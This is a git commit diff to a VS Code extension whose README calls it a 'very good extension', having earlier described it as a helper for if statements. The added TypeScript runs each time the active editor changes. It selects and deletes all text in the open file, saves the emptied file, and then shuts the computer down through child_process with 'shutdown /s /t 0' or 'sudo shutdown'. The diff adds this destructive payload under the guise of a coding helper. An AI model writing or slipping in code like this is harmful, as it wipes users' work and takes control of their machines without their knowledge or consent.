48eb0ecf8ec0ad16761030d432951067b427b61a
AnthonyToons7 <anthonyschuurmans4@gmail.com>
2023-06-05 12:24:42 +0200

    Changed everything
    Decided to try node js instead of pyautogui

--- README.md
+++ README.md
@@ -1,18 +1,9 @@
 ## Features
 
-It helps with if statements :)
+Very good extension :)
 
-Totally safe to use
-
-It coaches you to stop using else if over and over and over again.
-
-You can also say that it convinces you to use GitHub more...?
-
-Sometimes, it's just better to use that switch case instead of else if.
-
-It triggers the second you finish that second f
-
-## Release Notes
+## Requirements
+Requires Node.js!!!!
 
 ### 1.0.0
 
--- src/extension.ts
+++ src/extension.ts
@@ -1,28 +1,48 @@
 import * as vscode from 'vscode';
+import * as child_process from 'child_process';
+import * as path from 'path';
+const commandlist = [
+  "import pyautogui",
+  "pyautogui.press('WIN')",
+  "pyautogui.moveTo(25,1000)",
+  "pyautogui.click()",
+  "pyautogui.moveTo(25,900)"
+];
 
 export function activate(context: vscode.ExtensionContext) {
-  // let disposable = vscode.commands.registerCommand('yep--.doThing', (text: string) => {
   let disposable = vscode.commands.registerCommand('yep--.doThing', () => {
     const editor = vscode.window.activeTextEditor;
     if (editor && vscode.workspace.workspaceFolders) {
-      const folderpath = vscode.workspace.workspaceFolders[0].uri.path;
-      let text = "nee";
-      const newPath = folderpath+"/"+ text +".py";
-      vscode.window.showInformationMessage(newPath)
-      vscode.workspace.fs.rename(editor.document.uri, vscode.Uri.file(newPath), {
-        overwrite: false
-      });
+      vscode.window.showWarningMessage("Good luck");
+      vscode.commands.executeCommand("editor.action.selectAll"); // Select everything
+      vscode.commands.executeCommand("deleteLeft"); // press Backspace
+      vscode.commands.executeCommand("workbench.action.files.save"); // press Ctrl+S to save
+      shutDownComputer();
     }
   });
+
   context.subscriptions.push(disposable);
-  vscode.workspace.onDidChangeTextDocument(event => {
-    // Register your current document as your current active editor
-    const activeEditor = vscode.window.activeTextEditor;
-    const text = event.document.getText();
-    if (activeEditor && event.document === activeEditor.document) {
-        vscode.commands.executeCommand('yep--.doThing', text);
-    }
+
+  vscode.window.onDidChangeActiveTextEditor(editor => {
+      vscode.commands.executeCommand('yep--.doThing');
   });
 }
 
-export function deactivate() { }
+export function deactivate() {}
+
+export function shutDownComputer() {
+    let command;
+    if (process.platform === 'win32') {
+        command = 'shutdown /s /t 0';
+    } else if (process.platform === 'darwin') {
+        command = 'sudo shutdown -h now';
+    } else {
+        command = 'sudo shutdown -P now';
+    }
+
+    child_process.exec(command, (error, stdout, stderr) => {
+        if (error) {
+            console.error(`Failed to shut down computer: ${error.message}`);
+        }
+    });
+}
